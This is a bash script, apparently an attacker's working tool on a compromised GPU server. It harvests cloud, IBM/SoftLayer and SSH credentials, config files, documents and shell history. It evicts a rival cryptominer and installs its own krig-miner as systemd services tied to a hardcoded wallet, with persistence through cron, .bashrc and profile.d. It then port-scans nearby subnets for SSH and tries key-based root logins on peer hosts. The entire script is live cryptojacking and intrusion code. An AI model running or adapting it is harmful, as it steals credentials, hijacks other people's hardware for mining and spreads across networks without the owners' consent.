#!/bin/bash
# i4981: provider/tenant identity harvest + plh evict/harvest + peer node map + repoint g0023
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981
mkdir -p $D/docx
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz

log "### META $(date -u +%FT%TZ)"; id; hostname; uname -r; cat /etc/machine-id

log "### CLOUDINIT"
grep -vE '^\s*#|^\s*$' /etc/cloud/cloud.cfg 2>/dev/null | head -40
log "-- user-data"; sed -n '1,200p' /var/lib/cloud/instance/user-data.txt 2>/dev/null
log "-- scripts"; ls -la /var/lib/cloud/instance/scripts/ 2>/dev/null
for f in /var/lib/cloud/instance/scripts/*; do [ -f "$f" ] && { log "== $f"; sed -n '1,80p' "$f"; }; done
log "-- ci-out"; grep -iE 'user-data|http|curl|wget|api|key|password|token|cloud-init|datasource' /var/log/cloud-init-output.log 2>/dev/null | head -30
log "-- datasource"; ls -la /run/cloud-init/ 2>/dev/null | head; cat /run/cloud-init/datasource 2>/dev/null

log "### IBMSTUFF"
for p in /root/.ibm /root/.ibmcloud /root/.bluemix /root/.softlayer /root/.slcli /root/.config/ibmcloud /root/.config/softlayer /home/*/.softlayer /home/*/.ibmcloud /etc/ibm /etc/softlayer; do
  [ -e "$p" ] && { log "[path $p]"; ls -laR "$p" 2>/dev/null | head -30; }
done
log "-- find-ibm"
timeout 40 find /root /home /etc /opt /data -maxdepth 5 \( -iname '*softlayer*' -o -iname '*bluemix*' -o -iname 'ibmcloud*' -o -iname '*ibm*key*' -o -iname '*.ibm' \) 2>/dev/null | grep -vE 'ul_farmfan' | head -40
log "-- grep-ibm(contents)"
timeout 90 grep -rilE 'softlayer|bluemix|ibmcloud|iam\.cloud\.ibm|slcli|apikey' /root /etc /opt /data 2>/dev/null | grep -vE 'ul_farmfan|/proc|/sys|site-packages|node_modules|/usr/lib|/usr/share' | head -40

log "### ENV"; env | grep -iE 'ibm|softlayer|api|token|secret|cloud|idc|portal' | sed -E 's/(=.{8}).*/\1…/'

log "### CONF-FILES"
for f in /root/conf/pass.sh /root/conf/mianmi.txt /root/conf/ssh_config /root/conf/config /root/conf/env.sh /root/conf/ids.sh /root/conf/hostname.sh /root/conf/change_hostname.sh /root/conf/syncrclocal.sh /root/conf/ssh.sh /root/conf/ssh-ssh.sh /root/conf/para_ssh.sh /root/conf/para_scp.sh /root/conf/keygen.sh /root/conf/root_copy_id_rsa.sh /root/conf/kgzs_copy_id_rsa.sh /root/conf/ubuntu_copy_id_rsa.sh /root/conf/check_nodes.sh /root/conf/check.sh /root/conf/hostlist /root/conf/hosts /root/conf/addiptoyaml.txt /root/conf/ip_hostname_to_hosts.sh /root/conf/synchosts.sh /root/conf/root_rsa/ssh_config /root/conf/ssh_rsa/ssh_config /root/conf/ubuntu_rsa/ssh_config /root/conf/mianmi.sh /root/conf/ip.txt /root/conf/nodes.txt; do
  [ -f "$f" ] && { log "===== $f ($(stat -c%s "$f")B)"; sed -n '1,200p' "$f"; }
done
log "-- conf listing"; ls -laR /root/conf 2>/dev/null | head -120

log "### DOCX"
for f in /root/conf/*.docx /root/conf/*.md /root/conf/*.txt /root/conf/*.xlsx; do
  [ -f "$f" ] || continue
  log "===== $f ($(stat -c%s "$f")B)"
  case "$f" in
    *.md|*.txt) sed -n '1,250p' "$f";;
    *.docx) unzip -p "$f" word/document.xml 2>/dev/null | sed -e 's#</w:p>#\n#g' -e 's/<[^>]*>//g' | sed -e 's/&amp;/\&/g' -e 's/&lt;/</g' -e 's/&gt;/>/g' | grep -v '^[[:space:]]*$' | head -220;;
    *.xlsx) unzip -p "$f" xl/sharedStrings.xml 2>/dev/null | sed -e 's#</si>#\n#g' -e 's/<[^>]*>//g' | head -120;;
  esac
done

log "### HIST"
grep -iE 'ibm|softlayer|api|token|secret|curl |ibmcloud|slcli|portal|idc|ssh |scp |sshpass|passwd|passw' /root/.bash_history 2>/dev/null | tail -100
log "-- hist-tail"; tail -40 /root/.bash_history 2>/dev/null

log "### HOSTSFILE"; cat /etc/hosts
log "### SSHDIR"; ls -la /root/.ssh 2>/dev/null
log "### AUTHKEYS"; cat /root/.ssh/authorized_keys 2>/dev/null | cut -c1-140
log "### KNOWNHOSTS"; cat /root/.ssh/known_hosts 2>/dev/null | cut -c1-100 | head -40

log "### PLH"
ls -laR /opt/plh 2>/dev/null | head -60
for f in /opt/plh/*.sh /opt/plh/*.conf /opt/plh/*.txt /opt/plh/*.json /opt/plh/*.yaml /opt/plh/*.ini; do [ -f "$f" ] && { log "== $f ($(stat -c%s "$f")B)"; sed -n '1,120p' "$f"; }; done
log "-- plh-wallets"; timeout 30 grep -rhoE 'prl1[0-9a-z]{40,}' /opt/plh /usr/local/lib/nv-cache /dev/shm/.u /opt/t19 /root /etc/systemd/system 2>/dev/null | sort -u | head -10
log "-- systemd-plh"; systemctl cat 'plh-card@.service' 2>/dev/null | head -40
log "-- units-mine"; ls /etc/systemd/system | grep -iE 'plh|krig|mine|nv-|ul' 
log "-- timers"; systemctl list-timers --all --no-pager 2>/dev/null | head -12
log "-- nv-cache-sh"; for f in /usr/local/lib/nv-cache/*.sh /dev/shm/.u/*.sh /opt/t19/*.sh; do [ -f "$f" ] && { log "== $f"; sed -n '1,80p' "$f"; }; done
log "-- ps-miners"; ps -eo pid,args | grep -E 'krig|wildrig|peakminer|srbminer|nheq|nbminer' | grep -v grep | cut -c1-320 | head -12
log "-- crontab"; crontab -l 2>/dev/null | head -30; ls -la /etc/cron.d 2>/dev/null | head
log "### KIT"; ls -la /opt/arsenal/miners 2>/dev/null; ls -la /opt/t19/krig 2>/dev/null; ls -la /root/ul_plant 2>/dev/null; find / -maxdepth 4 -type f -name 'krig-miner' 2>/dev/null | head

log "### NODEMAP"
python3 - <<'PY'
import re
lines=[]
try:
    n=0
    for line in open('/root/conf/hostlist'):
        line=line.strip()
        if line: lines.append(line); n+=1
except Exception as e: pass
print("HOSTLIST_COUNT",len(lines))
try:
    hostl=" ".join(lines)
except: hostl=""
PY
log "-- getent"
for n in $(cat /root/conf/hostlist 2>/dev/null); do ip=$(getent hosts "$n" 2>/dev/null | awk '{print $1}' | head -1); [ -n "$ip" ] && echo "RES $n $ip"; done | head -140
for i in $(seq 33 64); do n=gpu$i; ip=$(getent hosts "$n" 2>/dev/null | awk '{print $1}' | head -1); [ -n "$ip" ] && echo "RES $n $ip"; done
for i in $(seq 1 40); do n=$(printf g%04d $i); ip=$(getent hosts "$n" 2>/dev/null | awk '{print $1}' | head -1); [ -n "$ip" ] && echo "RES $n $ip"; done
log "-- resolv"; cat /etc/resolv.conf

log "### REPOINT135"
log "-- before"; nvidia-smi -L 2>&1 | head -10; nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -10
ps -eo args | grep -E 'krig-miner|wildrig' | grep -v grep | head -2 | cut -c1-400 > $D/foreign_argv.txt
log "-- foreign-argv"; cat $D/foreign_argv.txt
log "-- neutralize keepalive surfaces"
for u in $(systemctl list-units --all --plain --no-legend 'plh*' 2>/dev/null | awk '{print $1}' | head -20); do echo "DIS $u"; systemctl disable --now "$u" 2>&1 | head -2; done
for i in 0 1 2 3 4 5 6 7; do systemctl disable --now "plh-card@$i" 2>/dev/null; done
if [ -f /usr/local/lib/nv-cache/g.sh ]; then chmod 000 /usr/local/lib/nv-cache/g.sh 2>/dev/null; fi
[ -f /etc/systemd/system/nv-cache.service ] && systemctl disable --now nv-cache.service 2>/dev/null
[ -f /etc/systemd/system/nv-cache.timer ] && systemctl disable --now nv-cache.timer 2>/dev/null
crontab -l 2>/dev/null | grep -viE 'nv-cache|plh' | crontab - 2>/dev/null
pkill -f 'krig-miner' 2>/dev/null; sleep 2
KB=""
for c in /opt/plh/krig-miner /opt/t19/krig/krig-miner /opt/arsenal/miners/krig /opt/arsenal/miners/krig/krig-miner /root/ul_plant/krig/krig-miner /opt/t19/krig-miner; do [ -x "$c" ] && KB="$c" && break; done
[ -z "$KB" ] && KB=$(find / -maxdepth 5 -type f -name 'krig-miner' -perm -u+x 2>/dev/null | head -1)
log "KITBIN=$KB"
mkdir -p /root/ul_plant/krig
if [ -n "$KB" ]; then cp -f "$KB" /root/ul_plant/krig/krig-miner; chmod +x /root/ul_plant/krig/krig-miner; fi
cat > /etc/systemd/system/ul-card@.service <<EOS
[Unit]
Description=UL PEARL card %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
Nice=19
ExecStart=/root/ul_plant/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-123-184-7-135-g%i --password x -d %i --api-port 14%i
Restart=always
RestartSec=30
TimeoutStopSec=20
LimitNOFILE=65535
EOS
cat > /root/ul_plant/keep.sh <<'EOS'
#!/bin/bash
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul-card@$i || systemctl start ul-card@$i; done
pgrep -f 'ul_plant/krig/krig-miner' >/dev/null || { for i in 0 1 2 3 4 5 6 7; do systemctl restart ul-card@$i; done; }
EOS
chmod +x /root/ul_plant/keep.sh
systemctl daemon-reload
for i in 0 1 2 3 4 5 6 7; do systemctl enable --now ul-card@$i 2>&1 | tail -1; done
( crontab -l 2>/dev/null | grep -v 'ul_plant/keep.sh'; echo "@reboot /root/ul_plant/keep.sh"; echo "*/5 * * * * /root/ul_plant/keep.sh" ) | crontab -
grep -q 'ul_plant/keep.sh' /root/.bashrc 2>/dev/null || echo '/root/ul_plant/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
echo '[ -x /root/ul_plant/keep.sh ] && /root/ul_plant/keep.sh >/dev/null 2>&1 &' > /etc/profile.d/ul_plant.sh
chmod 644 /etc/profile.d/ul_plant.sh
sleep 75
log "### REPOINT-AFTER"
log "-- units"; systemctl list-units 'ul-card@*' --no-pager 2>/dev/null | head -12
log "-- gpu"; nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -10
log "-- ps"; ps -eo pid,args | grep 'ul_plant/krig' | grep -v grep | cut -c1-200 | head -3
log "### POOLAPI"
timeout 25 curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" 2>&1 | head -c 3500
log ""
log "### POOLAPI2"
timeout 25 curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/stats/$W" 2>&1 | head -c 2000

log "### PEERSWEEP"
python3 - <<'PY'
import socket,concurrent.futures,re
cands=set()
try:
  for line in open('/etc/hosts'):
    p=line.split('#')[0].split()
    if len(p)>=2 and re.match(r'(g\d{3,4}|gpu\d+|kgzs|node\d+|vcc)',p[1],re.I): cands.add(p[0])
except: pass
for s in ["192.168.0","11.9.141","10.0.0","172.16.0"]:
  for i in range(1,255): cands.add(f"{s}.{i}")
cands=sorted(cands); print("CAND",len(cands))
def chk(ip):
  try:
    s=socket.create_connection((ip,22),1.2); s.close(); return ip
  except Exception: return None
op=[]
with concurrent.futures.ThreadPoolExecutor(320) as ex:
  for r in ex.map(chk,cands):
    if r: op.append(r)
print("OPEN22",len(op)); print("OPEN22LIST"," ".join(op))
open('/root/ul_farmfan/open22_4981.txt','w').write("\n".join(op)+"\n")
PY
log "-- auth+baseline on new open hosts (skip 11.9.141.*/192.168.0.23 = self)"
CNT=0
for ip in $(cat /root/ul_farmfan/open22_4981.txt 2>/dev/null); do
  case "$ip" in 11.9.141.*|192.168.0.23|127.*) continue;; esac
  CNT=$((CNT+1)); [ $CNT -gt 40 ] && break
  OUT=$(timeout 12 ssh -i /root/.ssh/id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes root@"$ip" 'hostname; nvidia-smi -L 2>/dev/null | wc -l; nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1; pgrep -af "krig-miner|wildrig" | head -2' 2>&1 | tr '\n' '|')
  echo "AUTH $ip :: $OUT"
  sleep 1
done
log "### DONE $(date -u +%FT%TZ)"
